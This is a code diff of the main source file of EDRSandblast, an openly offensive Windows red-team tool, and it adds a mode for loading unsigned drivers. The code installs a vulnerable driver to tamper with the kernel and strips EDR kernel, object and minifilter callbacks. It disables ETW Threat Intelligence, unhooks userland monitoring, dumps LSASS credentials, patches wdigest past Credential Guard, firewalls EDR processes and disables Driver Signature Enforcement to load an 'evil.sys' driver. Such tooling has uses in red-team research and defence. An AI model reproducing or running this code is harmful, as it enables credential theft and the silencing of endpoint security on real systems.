@@ -10,25 +10,41 @@
 #include <assert.h>
 #endif
 
+#include "CiOffsets.h"
 #include "CredGuard.h"
 #include "DriverOps.h"
 #include "FileUtils.h"
+#include "FltmgrOffsets.h"
 #include "Firewalling.h"
 #include "ETWThreatIntel.h"
 #include "KernelCallbacks.h"
+#include "KernelDSE.h"
 #include "KernelMemoryPrimitives.h"
-#include "ProcessDump.h"
-#include "ProcessDumpDirectSyscalls.h"
+#include "MinifilterCallbacks.h"
 #include "NtoskrnlOffsets.h"
 #include "ObjectCallbacks.h"
+#include "ProcessDump.h"
+#include "ProcessDumpDirectSyscalls.h"
 #include "PEBBrowse.h"
+#include "PrintFunctions.h"
 #include "RunAsPPL.h"
 #include "Syscalls.h"
 #include "Undoc.h"
 #include "UserlandHooks.h"
 #include "WdigestOffsets.h"
 
-#include "../EDRSandblast/EDRSandblast.h"
+//TODO P1 : implement a "clean" mode that only removes the driver if installed
+//TODO P2 : replace all instances of exit(1) by a clean_exit() function that uninstalls the driver before exiting
+
+typedef enum _START_MODE {
+    dump,
+    cmd,
+    credguard,
+    audit,
+    firewall,
+    load_unsigned_driver,
+    none
+} START_MODE;
 
 typedef NTSTATUS(NTAPI* NtQueryInformationProcess_f)(
     HANDLE          ProcessHandle,
@@ -39,11 +55,11 @@ typedef NTSTATUS(NTAPI* NtQueryInformationProcess_f)(
     );
 
 void PrintBanner() {
-    const TCHAR edrsandblast[] = TEXT("  ______ _____  _____   _____                 _ _     _           _   \r\n |  ____|  __ \\|  __ \\ / ____|               | | |   | |         | |  \r\n | |__  | |  | | |__) | (___   __ _ _ __   __| | |__ | | __ _ ___| |_ \r\n |  __| | |  | |  _  / \\___ \\ / _` | \'_ \\ / _` | \'_ \\| |/ _` / __| __|\r\n | |____| |__| | | \\ \\ ____) | (_| | | | | (_| | |_) | | (_| \\__ | |_ \r\n |______|_____/|_|  \\_|_____/ \\__,_|_| |_|\\__,_|_.__/|_|\\__,_|___/\\__|\n");   
+    const TCHAR edrsandblast[] = TEXT("  ______ _____  _____   _____                 _ _     _           _   \r\n |  ____|  __ \\|  __ \\ / ____|               | | |   | |         | |  \r\n | |__  | |  | | |__) | (___   __ _ _ __   __| | |__ | | __ _ ___| |_ \r\n |  __| | |  | |  _  / \\___ \\ / _` | \'_ \\ / _` | \'_ \\| |/ _` / __| __|\r\n | |____| |__| | | \\ \\ ____) | (_| | | | | (_| | |_) | | (_| \\__ | |_ \r\n |______|_____/|_|  \\_|_____/ \\__,_|_| |_|\\__,_|_.__/|_|\\__,_|___/\\__|\n");
     const TCHAR defcon[] = TEXT("D3FC0N 30 Edition");
     const TCHAR authors[2][256] = { TEXT("Thomas DIOT (@_Qazeer)"), TEXT("Maxime MEIGNAN (@th3m4ks)") };
-    
-    srand(time(NULL));
+
+    srand((unsigned int)time(NULL));
     int r = rand() % 2;
 
     _putts_or_not(edrsandblast);
@@ -74,72 +90,104 @@ BOOL WasRestarted() {
 
 int _tmain(int argc, TCHAR** argv) {
     // Parse command line arguments and initialize variables to default values if needed.
-    const TCHAR usage[] = TEXT("Usage: EDRSandblast.exe [-h | --help] [-v | --verbose] <audit | dump | cmd | credguard | firewall> [--usermode [--unhook-method <N>] [--direct-syscalls]] [--kernelmode] [--dont-unload-driver] [--no-restore] [--driver <RTCore64.sys>] [--service <SERVICE_NAME>] [--nt-offsets <NtoskrnlOffsets.csv>] [--wdigest-offsets <WdigestOffsets.csv>] [--add-dll <dll name or path>]* [-o | --dump-output <DUMP_FILE>]");
+    const TCHAR usage[] = TEXT("Usage: EDRSandblast.exe [-h | --help] [-v | --verbose] <audit | dump | cmd | credguard | firewall | load_unsigned_driver> \n\
+[--usermode] [--unhook-method <N>] [--direct-syscalls] [--add-dll <dll name or path>]* \n\
+[--kernelmode] [--dont-unload-driver] [--no-restore] \n\
+    [--nt-offsets <NtoskrnlOffsets.csv>] [--fltmgr-offsets <FltmgrOffsets.csv>] [--wdigest-offsets <WdigestOffsets.csv>] [--ci-offsets <CiOffsets.csv>] [--internet]\n\
+    [--vuln-driver <RTCore64.sys>] [--vuln-service <SERVICE_NAME>] \n\
+    [--unsigned-driver <evil.sys>] [--unsigned-service <SERVICE_NAME>] \n\
+    [--no-kdp]\n\
+[-o | --dump-output <DUMP_FILE>]\n");
     const TCHAR extendedUsage[] = TEXT("\n\
 -h | --help             Show this help message and exit.\n\
 -v | --verbose          Enable a more verbose output.\n\
 \n\
 Actions mode:\n\
 \n\
-\taudit           Display the user-land hooks and / or Kernel callbacks without taking actions.\n\
-\tdump            Dump the process specified by --process-name (LSASS process by default), as '<process_name>' in the current directory or at the\n\
-\t                specified file using -o | --output <DUMP_FILE>.\n\
-\tcmd             Open a cmd.exe prompt.\n\
-\tcredguard       Patch the LSASS process' memory to enable Wdigest cleartext passwords caching even if\n\
-\t                Credential Guard is enabled on the host. No kernel-land actions required.\n\
-\tfirewall        Add Windows firewall rules to block network access for the EDR processes / services.\n\
+\taudit                     Display the user-land hooks and / or Kernel callbacks without taking actions.\n\
+\tdump                      Dump the process specified by --process-name (LSASS process by default), as '<process_name>' in the current directory or at the\n\
+\t                          specified file using -o | --output <DUMP_FILE>.\n\
+\tcmd                       Open a cmd.exe prompt.\n\
+\tcredguard                 Patch the LSASS process' memory to enable Wdigest cleartext passwords caching even if\n\
+\t                          Credential Guard is enabled on the host. No kernel-land actions required.\n\
+\tfirewall                  Add Windows firewall rules to block network access for the EDR processes / services.\n\
+\tload_unsigned_driver      Load the specified unsigned driver, bypassing Driver Signature Enforcement (DSE).\n\
+\t                          WARNING: currently an experimental feature, only works if KDP is not present and enabled.\n\
 \n\
 --usermode              Perform user-land operations (DLL unhooking).\n\
 --kernelmode            Perform kernel-land operations (Kernel callbacks removal and ETW TI disabling).\n\
 \n\
---unhook-method <N>\n   Choose the userland un-hooking technique, from the following: \n\
 \n\
-\t0               Do not perform any unhooking (used for direct syscalls operations).\n\
-\t1 (Default)     Uses the (probably monitored) NtProtectVirtualMemory function in ntdll to remove all\n\
-\t                present userland hooks.\n\
-\t2               Constructs a 'unhooked' (i.e. unmonitored) version of NtProtectVirtualMemory, by\n\
-\t                allocating an executable trampoline jumping over the hook, and remove all present\n\
-\t                userland hooks.\n\
-\t3               Searches for an existing trampoline allocated by the EDR itself, to get an 'unhooked'\n\
-\t                (i.e. unmonitored) version of NtProtectVirtualMemory, and remove all present userland\n\
-\t                hooks.\n\
-\t4               Loads an additional version of ntdll library into memory, and use the (hopefully\n\
-\t                unmonitored) version of NtProtectVirtualMemory present in this library to remove all\n\
-\t                present userland hooks.\n\
-\t5               Allocates a shellcode that uses a direct syscall to call NtProtectVirtualMemory,\n\
-\t                and uses it to remove all detected hooks\n\
---direct-syscalls       Use direct syscalls to conduct the specified action if possible (for now only for process dump).\n\
+Hooking-related options:\n\
 \n\
-Other options:\n\
+--add-dll <dll name or path>            Loads arbitrary libraries into the process' address space, before starting\n\
+                                        anything.This can be useful to audit userland hooking for DLL that are not\n\
+                                        loaded by default by this program. Use this option multiple times to load\n\
+                                        multiple DLLs all at once.\n\
+                                        Example of interesting DLLs to look at: user32.dll, ole32.dll, crypt32.dll, \n\
+                                        samcli.dll, winhttp.dll, urlmon.dll, secur32.dll, shell32.dll...\n\
+\n\
+--unhook-method <N>                     Choose the userland un-hooking technique, from the following: \n\
+\n\
+\t0                               Do not perform any unhooking (used for direct syscalls operations).\n\
+\t1 (Default)                     Uses the (probably monitored) NtProtectVirtualMemory function in ntdll to remove all\n\
+\t                                present userland hooks.\n\
+\t2                               Constructs a 'unhooked' (i.e. unmonitored) version of NtProtectVirtualMemory, by\n\
+\t                                allocating an executable trampoline jumping over the hook, and remove all present\n\
+\t                                userland hooks.\n\
+\t3                               Searches for an existing trampoline allocated by the EDR itself, to get an 'unhooked'\n\
+\t                                (i.e. unmonitored) version of NtProtectVirtualMemory, and remove all present userland\n\
+\t                                hooks.\n\
+\t4                               Loads an additional version of ntdll library into memory, and use the (hopefully\n\
+\t                                unmonitored) version of NtProtectVirtualMemory present in this library to remove all\n\
+\t                                present userland hooks.\n\
+\t5                               Allocates a shellcode that uses a direct syscall to call NtProtectVirtualMemory,\n\
+\t                                and uses it to remove all detected hooks\n\
+\n\
+--direct-syscalls       Use direct syscalls to dump the selected process memory without unhooking unserland hooks.\n\
+\n\
+\n\
+BYOVD options:\n\
 \n\
 --dont-unload-driver                    Keep the vulnerable driver installed on the host\n\
                                         Default to automatically unsinstall the driver.\n\
 --no-restore                            Do not restore the EDR drivers' Kernel Callbacks that were removed.\n\
                                         Default to restore the callbacks.\n\
+--vuln-driver <") DEFAULT_DRIVER_FILE TEXT(">\t\tPath to the vulnerable driver file.\n\
+                                        Default to '") DEFAULT_DRIVER_FILE TEXT("' in the current directory.\n\
+--vuln-service <SERVICE_NAME>           Name of the vulnerable service to intall / start.\n\
 \n\
---driver <RTCore64.sys>                 Path to the Micro-Star MSI Afterburner vulnerable driver file.\n\
-                                        Default to 'RTCore64.sys' in the current directory.\n\
---service <SERVICE_NAME>                Name of the vulnerable service to intall / start.\n\
+\n\
+Driver sideloading options:\n\
+\n\
+--unsigned-driver <evil.sys>            Path to the unsigned driver file.\n\
+                                        Default to 'evil.sys' in the current directory.\n\
+--unsigned-service <SERVICE_NAME>       Name of the unsigned driver's service to intall / start.\n\
+--no-kdp                                Switch to g_CiOptions patching method for disabling DSE (default is callback swapping).\n\
+\n\
+\n\
+Offset-related options:\n\
 \n\
 --nt-offsets <NtoskrnlOffsets.csv>      Path to the CSV file containing the required ntoskrnl.exe's offsets.\n\
                                         Default to 'NtoskrnlOffsets.csv' in the current directory.\n\
+--fltmgr-offsets <FltmgrOffsets.csv>    Path to the CSV file containing the required fltmgr.sys's offsets\n\
+                                        Default to 'FltmgrOffsets.csv' in the current directory.\n\
 --wdigest-offsets <WdigestOffsets.csv>  Path to the CSV file containing the required wdigest.dll's offsets\n\
                                         (only for the 'credguard' mode).\n\
                                         Default to 'WdigestOffsets.csv' in the current directory.\n\
-\n\
---add-dll <dll name or path>            Loads arbitrary libraries into the process' address space, before starting\n\
-                                        anything. This can be useful to audit userland hooking for DLL that are not\n\
-                                        loaded by default by this program. Use this option multiple times to load\n\
-                                        multiple DLLs all at once.\n\
-                                        Example of interesting DLLs to look at: user32.dll, ole32.dll, crypt32.dll,\n\
-                                        samcli.dll, winhttp.dll, urlmon.dll, secur32.dll, shell32.dll...\n\
-\n\
--o | --output <DUMP_FILE>               Output path to the dump file that will be generated by the 'dump' mode.\n\
-                                        Default to 'process_name' in the current directory.\n\
-\
+--ci-offsets <CiOffsets.csv>            Path to the CSV file containing the required ci.dll's offsets\n\
+                                        (only for the 'load_unsigned_driver' mode).\n\
+                                        Default to 'WdigestOffsets.csv' in the current directory.\n\
 -i | --internet                         Enables automatic symbols download from Microsoft Symbol Server\n\
                                         If a corresponding *Offsets.csv file exists, appends the downloaded offsets to the file for later use\n\
-                                        OpSec warning: downloads and drops on disk a PDB file for ntoskrnl.exe and/or wdigest.dll\n");
+                                        OpSec warning: downloads and drops on disk a PDB file for the corresponding image\n\
+\n\
+Dump options:\n\
+\n\
+-o | --dump-output <DUMP_FILE>          Output path to the dump file that will be generated by the 'dump' mode.\n\
+                                        Default to 'process_name' in the current directory.\n\
+--process-name <NAME>                   File name of the process to dump (defaults to 'lsass.exe')\
+");
 
     BOOL status;
     HRESULT hrStatus = S_OK;
@@ -153,10 +201,16 @@ Other options:\n\
 
     START_MODE startMode = none;
     TCHAR driverPath[MAX_PATH] = { 0 };
+    TCHAR unsignedDriverPath[MAX_PATH] = { 0 };
     TCHAR driverDefaultName[] = DEFAULT_DRIVER_FILE;
+    TCHAR evilDriverDefaultName[] = DEFAULT_EVIL_DRIVER_FILE;
+    enum dseDisablingMethods_e dseMethod = CALLBACK_SWAPPING;
     TCHAR ntoskrnlOffsetCSVPath[MAX_PATH] = { 0 };
     TCHAR wdigestOffsetCSVPath[MAX_PATH] = { 0 };
-    TCHAR processName[] = TEXT("lsass.exe");
+    TCHAR ciOffsetCSVPath[MAX_PATH] = { 0 };
+    TCHAR fltmgrOffsetCSVPath[MAX_PATH] = { 0 };
+    TCHAR processName[MAX_PATH];
+    _tcscpy_s(processName, _countof(processName), TEXT("lsass.exe"));
     TCHAR outputPath[MAX_PATH] = { 0 };
     BOOL verbose = FALSE;
     BOOL removeVulnDriver = TRUE;
@@ -171,6 +225,7 @@ Other options:\n\
     BOOL ETWTIState = FALSE;
     BOOL foundNotifyRoutineCallbacks = FALSE;
     BOOL foundObjectCallbacks = FALSE;
+    BOOL foundMinifilterCallbacks = FALSE;
     HOOK* hooks = NULL;
     //TODO implement a "force" mode : remove notify routines & object callbacks without checking if it belongs to an EDR (useful as a last resort if a driver is not recognized)
 
@@ -190,6 +245,9 @@ Other options:\n\
         }
         else if (_tcsicmp(argv[i], TEXT("firewall")) == 0) {
             startMode = firewall;
+        }
+        else if (_tcsicmp(argv[i], TEXT("load_unsigned_driver")) == 0) {
+            startMode = load_unsigned_driver;
         }
         else if (_tcsicmp(argv[i], TEXT("-h")) == 0 || _tcsicmp(argv[i], TEXT("--help")) == 0) {
             _putts_or_not(usage);
@@ -211,7 +269,7 @@ Other options:\n\
         else if (_tcsicmp(argv[i], TEXT("--no-restore")) == 0) {
             restoreCallbacks = FALSE;
         }
-        else if (_tcsicmp(argv[i], TEXT("--driver")) == 0) {
+        else if (_tcsicmp(argv[i], TEXT("--vuln-driver")) == 0 || _tcsicmp(argv[i], TEXT("--driver")) == 0) {
             i++;
             if (i > argc) {
                 _tprintf_or_not(TEXT("%s"), usage);
@@ -219,13 +277,32 @@ Other options:\n\
             }
             _tcsncpy_s(driverPath, _countof(driverPath), argv[i], _tcslen(argv[i]));
         }
-        else if (_tcsicmp(argv[i], TEXT("--service")) == 0) {
+        else if (_tcsicmp(argv[i], TEXT("--unsigned-driver")) == 0) {
+            i++;
+            if (i > argc) {
+                _tprintf_or_not(TEXT("%s"), usage);
+                return EXIT_FAILURE;
+            }
+            _tcsncpy_s(unsignedDriverPath, _countof(unsignedDriverPath), argv[i], _tcslen(argv[i]));
+        }
+        else if (_tcsicmp(argv[i], TEXT("--vuln-service")) == 0 || _tcsicmp(argv[i], TEXT("--service")) == 0) {
             i++;
             if (i > argc) {
                 _tprintf_or_not(TEXT("%s"), usage);
                 return EXIT_FAILURE;
             }
             SetDriverServiceName(argv[i]);
+        }
+        else if (_tcsicmp(argv[i], TEXT("--unsigned-service")) == 0) {
+            i++;
+            if (i > argc) {
+                _tprintf_or_not(TEXT("%s"), usage);
+                return EXIT_FAILURE;
+            }
+            SetEvilDriverServiceName(argv[i]);
+        }
+        else if (_tcsicmp(argv[i], TEXT("--no-kdp")) == 0) {
+            dseMethod = G_CIOPTIONS_PATCHING;
         }
         else if (_tcsicmp(argv[i], TEXT("--nt-offsets")) == 0) {
             i++;
@@ -235,6 +312,14 @@ Other options:\n\
             }
             _tcsncpy_s(ntoskrnlOffsetCSVPath, _countof(ntoskrnlOffsetCSVPath), argv[i], _tcslen(argv[i]));
         }
+        else if (_tcsicmp(argv[i], TEXT("--fltmgr-offsets")) == 0) {
+            i++;
+            if (i > argc) {
+                _tprintf_or_not(TEXT("%s"), usage);
+                return EXIT_FAILURE;
+            }
+            _tcsncpy_s(fltmgrOffsetCSVPath, _countof(fltmgrOffsetCSVPath), argv[i], _tcslen(argv[i]));
+        }
         else if (_tcsicmp(argv[i], TEXT("--wdigest-offsets")) == 0) {
             i++;
             if (i > argc) {
@@ -242,6 +327,14 @@ Other options:\n\
                 return EXIT_FAILURE;
             }
             _tcsncpy_s(wdigestOffsetCSVPath, _countof(wdigestOffsetCSVPath), argv[i], _tcslen(argv[i]));
+        }
+        else if (_tcsicmp(argv[i], TEXT("--ci-offsets")) == 0) {
+            i++;
+            if (i > argc) {
+                _tprintf_or_not(TEXT("%s"), usage);
+                return EXIT_FAILURE;
+            }
+            _tcsncpy_s(ciOffsetCSVPath, _countof(ciOffsetCSVPath), argv[i], _tcslen(argv[i]));
         }
         else if (_tcsicmp(argv[i], TEXT("-o")) == 0 || _tcsicmp(argv[i], TEXT("--dump-output")) == 0) {
             i++;
@@ -299,7 +392,7 @@ Other options:\n\
     }
 
     // Command line option consistency checks.
-    if (startMode == none){
+    if (startMode == none) {
         _putts_or_not(TEXT("[!] You did not provide an action to perform: audit, dump, credguard or cmd"));
         return EXIT_FAILURE;
     }
@@ -320,15 +413,19 @@ Other options:\n\
     if (startMode == dump && !kernelMode) {
         _putts_or_not(TEXT("[!] LSASS dump might fail if RunAsPPL is enabled. Enable --kernelmode to bypass PPL\n"));
     }
-
+    if (startMode == load_unsigned_driver && !kernelMode) {
+        _putts_or_not(TEXT("'load_unsigned_driver' mode needs kernel-land DSE disabling operation to work, please enable --kernelmode"));
+        return EXIT_FAILURE;
+    }
     // TODO: set isSafeToExecutePayloadUserland by unhook to TRUE / FALSE if there are still hooks.
+
     BOOL isSafeToExecutePayloadUserland = TRUE;
     BOOL isSafeToExecutePayloadKernelland = TRUE;
 
     if (userMode) {
         _putts_or_not(TEXT("[===== USER MODE =====]\n"));
         _putts_or_not(TEXT("[+] Detecting userland hooks in all loaded DLLs..."));
-        hooks = searchHooks(NULL);
+        hooks = searchHooks(NULL); //TODO : change searchHooks to notify if code modifications have been found but not correctly identified as hooks
         _putts_or_not(TEXT(""));
 
         if (startMode != audit && unhook_method != UNHOOK_NONE) {
@@ -337,8 +434,10 @@ Other options:\n\
             }
             for (HOOK* ptr = hooks; ptr->disk_function != NULL; ptr++) {
                 printf_or_not("[+] [Hooks]\tUnhooking %s using method %ld...\n", ptr->functionName, unhook_method);
-                // TODO: return if all hook could be removed and set isSafeToExecutePayloadUserland.
-                unhook(ptr, unhook_method);
+                BOOL unhookSuccessful = unhook(ptr, unhook_method);
+                if (!unhookSuccessful) {
+                    isSafeToExecutePayloadUserland = FALSE;
+                }
             }
         }
         _putts_or_not(TEXT(""));
@@ -362,8 +461,8 @@ Other options:\n\
             PathAppend(ntoskrnlOffsetCSVPath, offsetCSVName);
         }
 
-        _putts_or_not(TEXT("[+] Setting up prerequisites for the kernel read/write primitives..."));
-        // Initialize the global variable containing ntoskrnl.exe Notify Routines', _PS_PROTECTION and ETW TI functions offsets.
+        _putts_or_not(TEXT("[+] Loading required offsets for ntoskrnl.exe..."));
+
         if (FileExists(ntoskrnlOffsetCSVPath)) {
             _putts_or_not(TEXT("[+] Loading kernel related offsets from the CSV file"));
             LoadNtoskrnlOffsetsFromFile(ntoskrnlOffsetCSVPath);
@@ -399,10 +498,18 @@ Other options:\n\
             PrintNtoskrnlOffsets();
         }
 
+        if (_tcslen(fltmgrOffsetCSVPath) == 0) {
+            PathAppend(fltmgrOffsetCSVPath, currentFolderPath);
+            PathAppend(fltmgrOffsetCSVPath, TEXT("FltmgrOffsets.csv"));
+        }
+        if (!LoadFltmgrOffsets(fltmgrOffsetCSVPath, internet)) {
+            return EXIT_FAILURE;
+        }
+
         // Install the vulnerable driver to have read / write in Kernel memory.
         LPTSTR serviceNameIfAny = NULL;
         BOOL isDriverAlreadyRunning = IsDriverServiceRunning(driverPath, &serviceNameIfAny);
-        if (isDriverAlreadyRunning){
+        if (isDriverAlreadyRunning) {
             _putts_or_not(TEXT("[+] Vulnerable driver is already running!\n"));
             SetDriverServiceName(serviceNameIfAny);
         }
@@ -434,17 +541,31 @@ Other options:\n\
             _putts_or_not(TEXT("[!] Couldn't allocate memory to enumerate the drivers in Kernel callbacks"));
             return EXIT_FAILURE;
         }
+
         foundNotifyRoutineCallbacks = EnumEDRNotifyRoutineCallbacks(foundEDRDrivers, verbose);
         if (foundNotifyRoutineCallbacks) {
             isSafeToExecutePayloadKernelland = FALSE;
         }
         _putts_or_not(TEXT(""));
-        
+
         _putts_or_not(TEXT("[+] Checking if EDR callbacks are registered on processes and threads handle creation/duplication..."));
         foundObjectCallbacks = EnumEDRProcessAndThreadObjectsCallbacks(foundEDRDrivers);
         _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\tObject callbacks are %s !\n"), foundObjectCallbacks ? TEXT("present") : TEXT("not found"));
         if (foundObjectCallbacks) {
             isSafeToExecutePayloadKernelland = FALSE;
+        }
+        _putts_or_not(TEXT(""));
+
+        _putts_or_not(TEXT("[+] Checking if EDR callbacks are registered on I/O events (minifilters)..."));
+        foundMinifilterCallbacks = EnumEDRMinifilterCallbacks(foundEDRDrivers, verbose);
+        _tprintf_or_not(TEXT("[+] [MinifilterCallbacks]\tMinifilter callbacks are %s !\n"), foundMinifilterCallbacks ? TEXT("present") : TEXT("not found"));
+        
+        if (foundMinifilterCallbacks) {
+#if WriteMemoryPrimitiveIsAtomic
+            isSafeToExecutePayloadKernelland = FALSE;
+#else
+            _putts_or_not(TEXT("WARNING: with the current driver (") DEFAULT_DRIVER_FILE TEXT("), EDRSandblast will not be able to remove these callbacks"));
+#endif
         }
         _putts_or_not(TEXT(""));
 
@@ -458,14 +579,17 @@ Other options:\n\
     }
 
     if (startMode != audit) {
-
+#ifdef _DEBUG
+        if (1) {
+#else
         if (isSafeToExecutePayloadKernelland && (isSafeToExecutePayloadUserland || directSyscalls)) {
+#endif
             _putts_or_not(TEXT("[+] Process is \"safe\" to launch our payload\n"));
 
             // Do the operation the tool was started for.
             switch (startMode) {
 
-            // Start a process executing cmd.exe.
+                // Start a process executing cmd.exe.
             case cmd:
                 _putts_or_not(TEXT("[+] Kernel callbacks have normally been removed, starting cmd.exe\n")
                     TEXT("WARNING: EDR kernel callbacks will be restored after exiting the cmd prompt (by typing exit)\n")
@@ -479,7 +603,7 @@ Other options:\n\
                 _tsystem(cmdPath);
                 break;
 
-            // Dump the LSASS process in a new thread.
+                // Dump the LSASS process in a new thread.
             case dump:
                 if (kernelMode) {
                     if (g_ntoskrnlOffsets.st.eprocess_protection != 0x0) {
@@ -533,10 +657,10 @@ Other options:\n\
                 pThreatArguments[1] = outputPath;
 
                 if (directSyscalls) {
-                    hThread = CreateThread(NULL, 0, SandMiniDumpWriteDumpFromThread, (PVOID) pThreatArguments, 0, NULL);
+                    hThread = CreateThread(NULL, 0, SandMiniDumpWriteDumpFromThread, (PVOID)pThreatArguments, 0, NULL);
                 }
                 else {
-                    hThread = CreateThread(NULL, 0, dumpProcessFromThread, (PVOID) pThreatArguments, 0, NULL);
+                    hThread = CreateThread(NULL, 0, dumpProcessFromThread, (PVOID)pThreatArguments, 0, NULL);
                 }
                 if (hThread) {
                     WaitForSingleObject(hThread, INFINITE);
@@ -556,7 +680,7 @@ Other options:\n\
                 }
                 break;
 
-            // Bypass Cred Guard (for new logins) by patching LSASS's wdigest module in memory.
+                // Bypass Cred Guard (for new logins) by patching LSASS's wdigest module in memory.
             case credguard:
                 if (_tcslen(wdigestOffsetCSVPath) == 0) {
                     TCHAR offsetCSVName[] = TEXT("\\WdigestOffsets.csv");
@@ -612,7 +736,7 @@ Other options:\n\
                 }
                 break;
 
-            // Add firewall rules to block EDR network communications.
+                // Add firewall rules to block EDR network communications.
             case firewall:
             {
                 hrStatus = S_OK;
@@ -629,6 +753,81 @@ Other options:\n\
                 }
                 _tprintf_or_not(TEXT("\n"));
                 FirewallPrintManualDeletion(&sFWEntries);
+                break;
+            }
+            // Load an unsigned kernel driver.
+            case load_unsigned_driver:
+            {
+                if (_tcslen(ciOffsetCSVPath) == 0) {
+                    PathAppend(ciOffsetCSVPath, currentFolderPath);
+                    PathAppend(ciOffsetCSVPath, TEXT("\\CiOffsets.csv"));
+                }
+
+                BOOL ciOffsetsWereLoaded = LoadCiOffsets(ciOffsetCSVPath, internet);
+
+                if (!ciOffsetsWereLoaded) {
+                    _putts_or_not(TEXT("[!] The offsets must be computed using the provided script and added to the offsets CSV file (or use --internet). Unsigned driver won't be loaded ...\n"));
+                    lpExitCode = EXIT_FAILURE;
+                    break;
+                }
+
+                _putts_or_not(TEXT(""));
+                if (!kernelMode) {
+                    lpExitCode = EXIT_FAILURE;
+                    break;
+                }
+                if (_tcslen(unsignedDriverPath) == 0) {
+                    PathAppend(unsignedDriverPath, currentFolderPath);
+                    PathAppend(unsignedDriverPath, evilDriverDefaultName);
+                }
+                if (!FileExists(unsignedDriverPath)) {
+                    _tprintf_or_not(TEXT("[!] Required driver file not present at %s\nExiting...\n"), unsignedDriverPath);
+                    lpExitCode = EXIT_FAILURE;
+                    break;
+                }
+
+                BOOL ciWasEnabled = IsCiEnabled();
+                if (ciWasEnabled)
+                {
+                    BOOL disablingWasSuccessful = disableDSE(dseMethod, verbose);
+                    if (!disablingWasSuccessful) {
+                        _putts_or_not(TEXT("[-] DSE could not have been disabled, aborting ...\n"));
+                        lpExitCode = EXIT_FAILURE;
+                        break;
+                    }
+                    _putts_or_not(TEXT("[+] DSE is now disabled"));
+                }
+                else {
+                    _putts_or_not(TEXT("[-] CI is already disabled!\n"));
+                }
+
+
+                LPTSTR evilServiceNameIfAny = NULL;
+                BOOL isEvilDriverAlreadyRunning = IsDriverServiceRunning(unsignedDriverPath, &evilServiceNameIfAny);
+                if (isEvilDriverAlreadyRunning) {
+                    _putts_or_not(TEXT("[+] Evil driver is already running!\n"));
+                    SetEvilDriverServiceName(evilServiceNameIfAny);
+                }
+                else {
+                    _putts_or_not(TEXT("[+] Installing evil driver..."));
+                    status = InstallEvilDriver(unsignedDriverPath);
+                    if (status != TRUE) {
+                        _putts_or_not(TEXT("[!] An error occurred while installing the evil driver"));
+                        lpExitCode = EXIT_FAILURE;
+                        break;
+                    }
+                }
+                if (ciWasEnabled) {
+                    BOOL reenablingWasSuccessful = reenableDSE(dseMethod, verbose);
+                    if (!reenablingWasSuccessful) {
+                        _putts_or_not(TEXT("[-] DSE could not have been re-enabled; WARNING: this might trigger a PatchGuard BSoD in the following minutes...\n"));
+                        lpExitCode = EXIT_FAILURE;
+                        break;
+                    }
+                    _putts_or_not(TEXT("[+] DSE is enabled again"));
+
+                }
+
                 break;
             }
             }
@@ -664,7 +863,13 @@ Other options:\n\
                 DisableEDRProcessAndThreadObjectsCallbacks(foundEDRDrivers);
                 _putts_or_not(TEXT(""));
             }
-
+#if WriteMemoryPrimitiveIsAtomic
+            if (foundMinifilterCallbacks) {
+                _putts_or_not(TEXT("[+] Removing minifilter callbacks registered by EDR for monitoring I/O operations..."));
+                RemoveEDRMinifilterCallbacks(foundEDRDrivers);
+                _putts_or_not(TEXT(""));
+            }
+#endif
             /*
             * 2/3 : Starting "resursively" our process.
             */
@@ -703,7 +908,13 @@ Other options:\n\
                 EnableEDRProcessAndThreadObjectsCallbacks(foundEDRDrivers);
                 _putts_or_not(TEXT(""));
             }
-
+#if WriteMemoryPrimitiveIsAtomic
+            if (restoreCallbacks == TRUE && foundMinifilterCallbacks) {
+                _putts_or_not(TEXT("[+] Restoring EDR's minifilter callbacks..."));
+                RestoreEDRMinifilterCallbacks(foundEDRDrivers);
+                _putts_or_not(TEXT(""));
+            }
+#endif
             // Renable the ETW Threat Intel provider.
             // TODO : make this conditionnal, just as kernel callbacks restoring ?
             if (ETWTIState) {
@@ -725,7 +936,7 @@ Other options:\n\
         status = UninstallVulnerableDriver();
         if (status == FALSE) {
             _putts_or_not(TEXT("[!] An error occured while attempting to uninstall the vulnerable driver"));
-            _tprintf_or_not(TEXT("[*] The service should be manually deleted: cmd /c sc delete %s\n"), GetDriverServiceName());
+            _tprintf_or_not(TEXT("[*] The service should be manually deleted and the computer restarted. Use: cmd /c sc delete %s\n"), GetDriverServiceName());
             lpExitCode = EXIT_FAILURE;
         }
         else {
